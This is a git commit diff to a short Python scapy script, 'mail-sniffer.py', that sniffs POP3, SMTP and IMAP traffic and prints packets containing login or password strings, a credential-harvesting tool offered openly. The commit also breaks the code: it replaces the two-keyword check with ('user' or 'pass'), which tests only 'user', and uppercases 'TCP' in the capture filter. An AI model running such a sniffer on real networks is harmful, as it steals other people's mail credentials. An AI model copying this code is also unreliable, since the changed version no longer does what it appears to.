5c83ee689b3cc3a037533ab6037b77c69092f3fb
Samuel Riddle <30331129+sjriddle@users.noreply.github.com>
2020-04-08 19:26:28 -0600

    Update mail-sniffer.py

--- mail-sniffer.py
+++ mail-sniffer.py
@@ -4,7 +4,7 @@ from scapy.all import *
 def packet_callback(packet):
     if packet[TCP].payload:
         mail_packet = str(packet[TCP].payload)
-        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+        if ("user" or "pass") in mail_packet.lower():
             print(f'[*] Server: {packet[IP].dst}')
             print(f'[*] {packet[TCP].payload}')
-sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
+sniff(filter="TCP port 110 or TCP port 25 or TCP port 143", prn=packet_callback, store=0)
